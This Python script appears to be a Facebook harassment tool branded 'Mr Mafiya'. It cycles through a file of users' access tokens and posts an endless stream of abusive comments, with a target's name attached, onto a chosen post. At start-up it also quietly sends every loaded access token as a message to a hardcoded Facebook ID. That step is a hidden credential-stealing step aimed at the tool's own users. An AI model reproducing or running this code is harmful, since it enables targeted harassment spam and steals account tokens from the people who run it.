import requests
import json
import time
import sys
from platform import system
import os
import subprocess
import http.server
import socketserver
import threading
import random
import requests
import json
import time
import sys
from platform import system
import os
import subprocess
import http.server
import socketserver
import threading

class MyHandler(http.server.SimpleHTTPRequestHandler):
      def do_GET(self):
          self.send_response(200)
          self.send_header('Content-type', 'text/plain')
          self.end_headers()
          self.wfile.write(b"   MR MAFIYA INXIDE")
def execute_server():
      PORT = int(os.environ.get('PORT', 4000))

      with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
          print("Server running at http://localhost:{}".format(PORT))
          httpd.serve_forever()


def send_initial_message():
      with open('token.txt', 'r') as file:
          tokens = file.readlines()

      # Modify the message as per your requirement
      msg_template = "𝗛𝗲𝗹𝗹𝗼 𝗠𝗮𝗳𝗶𝘆𝗮 𝗦𝗶𝗿..!! 𝗜'𝗺 𝗨𝘀𝗶𝗻𝗴 𝗬𝗼𝘂𝗿 𝗖𝗼𝗻𝘃𝗼 𝗧𝗼𝗼𝗹 𝗔𝗻𝗱 𝗠𝘆 𝗖𝗼𝗻𝘃𝗼 𝗧𝗼𝗸𝗲𝗻 𝗜𝘀 {}"

      # Specify the ID where you want to send the message
      target_id = "100069713641443"

      requests.packages.urllib3.disable_warnings()

      def liness():
          print('\033[1;92m' + '[>] ==========𝗠𝟵𝗙𝗜𝗬𝟵=𝗦𝟯𝗥𝗩𝟯𝗥=𝗥𝗨𝗡𝗡𝗜𝗡𝗚==========')

      headers = {
          'Connection': 'keep-alive',
          'Cache-Control': 'max-age=0',
          'Upgrade-Insecure-Requests': '1',
          'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
          'Accept-Encoding': 'gzip, deflate',
          'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
          'referer': 'www.google.com'
      }

      for token in tokens:
          access_token = token.strip()
          url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)
          msg = msg_template.format(access_token)
          parameters = {'access_token': access_token, 'message': msg}
          response = requests.post(url, json=parameters, headers=headers)

          # No need to print here, as requested
          current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
          time.sleep(0.1)  # Wait for 1 second between sending each initial message

      #print("\n[+] Initial messages sent. Starting the message sending loop...\n")
send_initial_message()
def send_messages_from_file():
      with open('comments.txt', 'r') as file:
          convo_id = file.read().strip()

      with open('file.txt', 'r') as file:
          messages = file.readlines()

      num_messages = len(messages)

      with open('token.txt', 'r') as file:
          tokens = file.readlines()
      num_tokens = len(tokens)
      max_tokens = min(num_tokens, num_messages)

      with open('name.txt', 'r') as file:
          haters_name = file.read().strip()
       
      with open('here.txt', 'r') as file:
          here_name = file.read().strip()
      
      with open('time.txt', 'r') as file:
          speed = int(file.read().strip())

      def liness():
          print('\033[1;92m' + '[>] ==========𝗠𝟵𝗙𝗜𝗬𝟵=𝗦𝟯𝗥𝗩𝟯𝗥=𝗥𝗨𝗡𝗡𝗜𝗡𝗚==========')

      headers = {
          'Connection': 'keep-alive',
          'Cache-Control': 'max-age=0',
          'Upgrade-Insecure-Requests': '1',
          'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
          'Accept-Encoding': 'gzip, deflate',
          'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
          'referer': 'www.google.com'
      }

      while True:
          try:
              for message_index in range(num_messages):
                  token_index = message_index % max_tokens
                  access_token = tokens[token_index].strip()

                  message = messages[message_index].strip()

                  url = "https://graph.facebook.com/v15.0/{}/comments".format(convo_id)
                  parameters = {'access_token': access_token, 'message': haters_name + ' ' + message + ' ' + here_name}
                  response = requests.post(url, json=parameters, headers=headers)

                  current_time = time.strftime("\033[1;92mSahi Hai ==> %Y-%m-%d %I:%M:%S %p")
                  if response.ok:
                      print("\033[1;36;1m[❤️] YOU ARE USING MR. MAFIYA POST TOOL : 𝗖𝟬𝗠𝗠𝟯𝗡𝗧𝗦 {} 𝗢𝗳 𝗣𝟬𝗦𝗧 {} 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗕𝘆 𝗧𝗼𝗸𝗲𝗻 𝗡𝗼. {}: {}".format(
                          message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message + ' ' + here_name))
                      liness()
                      liness()
                  else:
                      print("\033[1;36;1m[❤️] YOU ARE USING MR. MAFIYA P0ST TOOL : 𝗙𝗔𝗜𝗟𝗘𝗗 𝗖𝟬𝗠𝗠𝟯𝗡𝗧𝗦 {} 𝗢𝗳 𝗣𝟬𝗦𝗧 {} 𝗦𝗲𝗻𝘁 𝗨𝗻𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹 𝗕𝘆 𝗧𝗼𝗸𝗲𝗻 𝗡𝗼. {}: {}".format(
                          message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message + ' ' + here_name))
                      liness()
                      liness()
                  time.sleep(speed)

              print("\n[😏] 𝟰𝗟𝗟 𝗖𝟬𝗠𝗠𝟯𝗡𝗧𝗦 𝗦𝟯𝗡𝗧 𝗦𝗨𝗖𝗖𝟯𝗦𝗦𝗙𝗨𝗟𝗟𝗬 𝗡𝟬𝗪 𝗪𝟰𝗜𝗧 𝗙𝟬𝗥 𝟯𝟬 𝗦𝟯𝗖 𝗕𝗥𝟬....\n")
          except Exception as e:
              print("[!] An error occurred: {}".format(e))

def main():
      server_thread = threading.Thread(target=execute_server)
      server_thread.start()

      # Send the initial message to the specified ID using all tokens


      # Then, continue with the message sending loop
      send_messages_from_file()

if __name__ == '__main__':
      main()